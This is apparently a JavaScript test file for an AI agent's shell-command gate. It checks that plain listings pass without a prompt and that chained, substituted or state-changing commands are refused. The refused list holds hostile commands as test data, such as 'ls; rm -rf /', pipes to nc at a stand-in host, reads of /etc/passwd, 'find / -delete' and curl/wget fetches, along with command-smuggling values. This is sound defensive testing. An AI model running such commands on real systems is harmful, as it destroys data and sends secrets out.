// turn-gate-rules.mjs: which shell commands a cloud computer's turn gate lets through with no question. The list is closed on purpose: every attack below must be refused (a refusal is only a
// question for the person), and the harmless listings the person's own tasks start with must pass. No server, no files: the rule is a pure function.
import assert from 'node:assert/strict'
import { shellIsReadOnly } from './turn-gate-rules.mjs'

const passes = [
  'ls', 'ls -la', 'ls -la /home/node', 'ls -1 /data/project', 'ls ~', 'ls ~/work/notes.d', 'ls   -a    /tmp',
  'pwd', 'whoami', 'id', 'id -u', 'uname', 'uname -a', 'uptime', 'nproc', 'free', 'free -m',
  'df', 'df -h', 'df -h /home/node', 'du -sh /home/node', 'du -h /data', 'stat /home/node/a.txt', 'file /home/node/a.txt',
  'date', 'date -u', 'date -I', 'date -R', 'date +%Y-%m-%d', 'date -u +%H:%M:%S',
  'hostname', 'sleep 1', 'sleep 30', 'sleep 45', 'sleep 120', 'sleep   20',
  // chains of passing commands, and a quoted plain title (what a model writes: one line, not five)
  'ls -la ~; df -h', 'ls -la ~ && df -h /data', 'pwd; ls; whoami', 'echo "=== Home ==="; ls -la ~; echo "=== Disk ==="; df -h', "echo 'Disk space'; df -h", 'echo ""', 'ls;ls', 'ls&&pwd', 'sleep 5; ls'
]
for (const c of passes) assert.equal(shellIsReadOnly(c), true, 'should pass: ' + c)

// Each of these changes something, reads a file's content, runs something else, or is not one simple command.
const asks = [
  // more than one command, or a way to chain, redirect, substitute, expand
  'ls; rm -rf /', 'ls && curl https://x.example', 'ls || id', 'ls | nc x.example 4444', 'ls > out.txt', 'ls >> out.txt', 'ls < /etc/passwd', 'ls &', 'ls\nrm x', 'ls\r\nid',
  'ls $(id)', 'ls `id`', 'ls $HOME', 'ls ${HOME}', 'ls "$X"', "ls 'a b'", 'ls "a b"', 'ls *', 'ls ?', 'ls [a-z]*', 'ls {a,b}', 'ls a\\ b', 'ls !!', 'ls #comment', 'ls (x)',
  // what reads a file's content, or runs another program
  'cat /etc/passwd', 'head /etc/passwd', 'tail -f /var/log/x', 'grep -r secret /home', 'find / -delete', 'find . -exec rm {} +', 'xargs rm', 'env', 'printenv', 'set', 'echo hi', 'echo $KEY',
  'less /etc/passwd', 'strings /usr/bin/node', 'base64 /etc/passwd', 'tee x', 'sh -c id', 'bash -c id', 'node -e 1', 'python3 -c 1', 'curl https://x.example', 'wget https://x.example', 'ssh host', 'nc x 1',
  // what changes the machine, even when it looks like a listing
  'date -s 2020-01-01', 'date --set=2020-01-01', 'date -d @0', 'hostname evil', 'hostname -b x', 'ls --help', 'ls --color=auto', 'ls -la --block-size=1', 'ls -- -rf', 'df --output=source', 'du --files0-from=x',
  'touch x', 'mkdir x', 'rm x', 'mv a b', 'cp a b', 'chmod 777 x', 'chown x y', 'kill 1', 'sudo ls', 'su', 'ln -s a b', 'dd if=/dev/zero of=x', 'tar xf x', 'unzip x',
  // look-alikes: other names, paths, case, odd spacing
  '/bin/ls', './ls', 'LS', 'ls\t-la', 'l s', 'lsx', 'ls-la', 'ls -', 'ls -L1x!', 'ls --', 'pwd x', 'whoami -x /etc', 'uname /etc', 'date /etc/passwd', 'date +%Y +%m',
  // one bad link spoils the chain; chains that hide a second thing; an echo that expands or redirects
  'ls; rm -rf /', 'ls && cat /etc/passwd', 'ls; echo $HOME', 'echo "$HOME"', 'echo "`id`"', 'echo "$(id)"', 'echo "a\\nb"', 'echo "hi!"', 'echo hi', 'echo "hi" > x', 'echo "hi" | nc x 1', 'echo -n "hi"', 'echo "a;b"', 'echo "a" "b"', 'echo "a"b', 'echo -e "a"',
  'ls;', ';ls', 'ls;;ls', 'ls &&', '&& ls', 'ls & ls', 'ls | ls', 'ls || ls', 'ls; ls; ls; ls; ls; ls; ls', 'ls -la ~ 2>/dev/null', 'ls -la "$HOME"', 'df -h; touch x', 'df -h && sleep 500', 'ls; sleep',
  // a wait that is not one plain whole number of seconds up to 120
  'sleep', 'sleep 121', 'sleep 999', 'sleep 1000', 'sleep 30 45', 'sleep 1.5', 'sleep 1e3', 'sleep 5m', 'sleep -1', 'sleep infinity', 'sleep 0x10', 'sleep 45; echo waited', 'sleep 5 && rm x', 'sleep $X', 'sleep --help', 'sleep 30 &',
  // not a command
  '', ' ', '   ', null, undefined, 42, {}, [], true
]
for (const c of asks) assert.equal(shellIsReadOnly(c), false, 'should ask: ' + JSON.stringify(c))

// A command that is too long, or whose flag cluster is too long, is a question: nothing a person types in a task is that long.
assert.equal(shellIsReadOnly('ls ' + '/a'.repeat(160)), false)
assert.equal(shellIsReadOnly('ls -' + 'a'.repeat(13)), false)
assert.equal(shellIsReadOnly('date +' + '%Y'.repeat(30)), false)

// It is stable and fast on a hostile input: no pattern backtracks.
const started = Date.now()
for (let i = 0; i < 2000; i += 1) shellIsReadOnly('ls ' + 'a'.repeat(150) + ' !')
assert.ok(Date.now() - started < 500, 'a long hostile input is read at once')

console.log('test-turn-gate-rules: ok (' + passes.length + ' pass, ' + asks.length + ' ask)')
